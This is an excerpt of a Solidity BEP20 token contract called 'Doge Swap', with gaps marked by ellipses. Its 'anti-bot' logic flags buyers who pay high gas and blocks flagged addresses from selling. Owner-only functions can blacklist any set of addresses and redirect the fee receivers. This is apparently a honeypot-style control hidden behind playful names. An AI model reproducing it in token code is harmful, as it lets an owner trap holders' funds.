...
contract DOGESWAP is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Doge Swap";
    string constant _symbol = "DOGESWAP";
    ...
    // Anti-Bot v2
    uint256 public maxFuelPrice = 7000000000;
    bool public rocketFuel = true;
    mapping (address => bool) public isMoneyBunny;
    ...
    event RocketFuelCheckin(address guest, uint256 rentPaid);
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0xEA5619533faf06De006BAb6b2aA744246928c3aB;
        devFeeReceiver = 0x594523053Ade264791033b673916aE85D73e783e;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(rocketFuel){
            require(!isMoneyBunny[sender],"Bots cant sell");
            if(tx.gasprice > maxFuelPrice && sender == pair){
                isMoneyBunny[recipient] = true;
    ...
    // lobby manager
    function enable_rocketFuel(bool _status) public onlyOwner {
        rocketFuel = _status;
    }

    function set_max_fuelprice(uint256 _rent_withoutdecimal) public onlyOwner {
        maxFuelPrice = _rent_withoutdecimal * 10**9;
    }

    function manage_MoneyBunny(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isMoneyBunny[addresses[i]] = status;
        }
    }
    ...
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver, address _buybackFeeReceiver ) external authorized {
        ...
        buybackReceiver = _buybackFeeReceiver;
